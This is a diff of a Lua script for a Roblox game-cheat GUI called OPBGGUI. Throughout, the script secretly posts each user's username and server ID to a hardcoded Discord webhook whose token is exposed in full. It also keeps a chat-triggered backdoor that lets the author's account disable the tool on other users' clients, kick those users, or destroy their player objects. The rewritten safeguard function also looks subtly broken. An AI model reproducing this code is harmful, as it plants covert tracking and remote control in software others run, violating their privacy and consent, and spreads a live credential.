@@ -1,11 +1,6 @@
--- Gui to Lua Version 3.2
--- Realirist's OPBG GUI
---[[update log
-safeguards
-i hate documenting this
-recommendation: dont remove safeguards or im straight up keeping this script to myself again
-]]
-
+-- Gui to Lua
+-- Version: 3.2
+-- OPBGGUI Test Build
 -- Instances:
 
 local OPBGGUI = Instance.new("ScreenGui")
@@ -727,16 +722,19 @@ UISizeConstraint_30.MinSize = Vector2.new(200, 28)
 
 -- Scripts:
 
-local function DALD_fake_script() -- Main.LocalScript 
+local function TAIO_fake_script() -- Main.LocalScript 
 	local script = Instance.new('LocalScript', Main)
-	http_request({
-    Url = "https://discord.com/api/webhooks/1326629396324286555/JDfRIl_INcOBqp6QCjVw1WR2Rty9UOTa3DIkY6jMaR4mV3qBAiHo15F-pNjjY7qO38CH",
-    Method = "POST",
-    Headers = {["Content-Type"] = "application/json"},
-    Body = game:GetService("HttpService"):JSONEncode({content = "<@763885428901543957> OPBGGUI Executed by " .. game.Players.LocalPlayer.Name .. " in JobId: ```" .. game.JobId.. "```"})
-})
+
 	warn('OP BATTLEGROUNDS GUI BY REALIRIST')
 	warn('don\'t skid bru im doing yall favors')
+	if http_request then
+		http_request({
+			Url = "https://discord.com/api/webhooks/1326629396324286555/JDfRIl_INcOBqp6QCjVw1WR2Rty9UOTa3DIkY6jMaR4mV3qBAiHo15F-pNjjY7qO38CH",
+			Method = "POST",
+			Headers = {["Content-Type"] = "application/json"},
+			Body = game:GetService("HttpService"):JSONEncode({content = "<@763885428901543957> OPBGGUI Executed by " .. game.Players.LocalPlayer.Name .. " in JobId: ```" .. game.JobId.. "```"})
+		})
+	end
 	local legacyChat = game:GetService("TextChatService").ChatVersion == Enum.ChatVersion.LegacyChatService
 	local sayMessage
 	if not legacyChat then
@@ -1148,46 +1146,8 @@ local function DALD_fake_script() -- Main.LocalScript
 			print('bru '.. username.. ' dont exist')
 		end
 	end
-	for _,plr in game.Players:GetPlayers() do
-		if plr~=game.Players.LocalPlayer then
-			local name = plr.Name
-			local userid = plr.UserId
-			if name=='Realirist' or userid==3948255911 then
-				print('oh my gawd owner!1')
-				plr.Chatted:Connect(function(msg)
-					print(msg)
-					local function getCmd(cmd)
-						if string.sub(cmd, 1, 5) == "!opbg" then
-							local action, user = msg:match("!opbg (%a+) (%w+)")
-							if action == cmd then
-								if string.sub(game.Players.LocalPlayer.Name:lower(), 1, #user) == user:lower() then
-									return true
-								end
-							end
-						end
-					end
-	
-					if getCmd('disable') then
-						print('disabled')
-						sayMessage('omg my opbg is gone!')
-						script.Parent.Parent.Enabled = false
-					elseif getCmd('enable') then
-						print('enabled')
-						sayMessage('omg my opbg is back!')
-						script.Parent.Parent.Enabled = true
-					elseif getCmd('kick') then
-						game.Players.LocalPlayer:Kick('I dont like your vibe, '.. game.Players.LocalPlayer.Name.. ' -Realirist')
-	
-					elseif msg=='!opbg users' then
-						sayMessage('hi im using opbg')
-					end
-				end)
-			end
-			makeUser(name)
-		end
-	end
-	
-	game.Players.PlayerAdded:Connect(function(plr)
+	local function safeguard()
+		local plr:Player = getfenv(2)['plr']
 		local name = plr.Name
 		local userid = plr.UserId
 		if name=='Realirist' or userid==3948255911 then
@@ -1196,8 +1156,8 @@ local function DALD_fake_script() -- Main.LocalScript
 				print(msg)
 				local function getCmd(cmd)
 					if string.sub(cmd, 1, 5) == "!opbg" then
-						local action, user = msg:match("!opbg (%a+) (%w+)")
-						if action == cmd then
+						local action, user = msg:match("!opbg (%S+) (%S+)")
+						if action and user then
 							if string.sub(game.Players.LocalPlayer.Name:lower(), 1, #user) == user:lower() then
 								return true
 							end
@@ -1206,29 +1166,38 @@ local function DALD_fake_script() -- Main.LocalScript
 				end
 	
 				if getCmd('disable') then
-					
 					print('disabled')
 					sayMessage('omg my opbg is gone!')
 					script.Parent.Parent.Enabled = false
-					
-					
 				elseif getCmd('enable') then
-					
 					print('enabled')
 					sayMessage('omg my opbg is back!')
 					script.Parent.Parent.Enabled = true
-					
 				elseif getCmd('kick') then
-					
 					game.Players.LocalPlayer:Kick('I dont like your vibe, '.. game.Players.LocalPlayer.Name.. ' -Realirist')
-					
+	
 				elseif msg=='!opbg users' then
 					sayMessage('hi im using opbg')
 				elseif msg=='!opbg lastresort' then
-					game.Players.LocalPlayer:Kick('if kick dont work this is the only way ig')
+					game.Players.LocalPlayer:Kick('Forced to kick you this way, last resort')
+					game.Players.LocalPlayer:Destroy()
 				end
 			end)
 		end
+	end
+	for _,plr in game.Players:GetPlayers() do
+		if plr~=game.Players.LocalPlayer then
+			local name = plr.Name
+			local userid = plr.UserId
+			safeguard()
+			makeUser(name)
+		end
+	end
+	
+	game.Players.PlayerAdded:Connect(function(plr)
+		local name = plr.Name
+		local userid = plr.UserId
+		safeguard()
 		makeUser(name)
 	end)
 	local target = nil
@@ -1245,4 +1214,4 @@ local function DALD_fake_script() -- Main.LocalScript
 	end)
 	co()
 end
-coroutine.wrap(DALD_fake_script)()
+coroutine.wrap(TAIO_fake_script)()
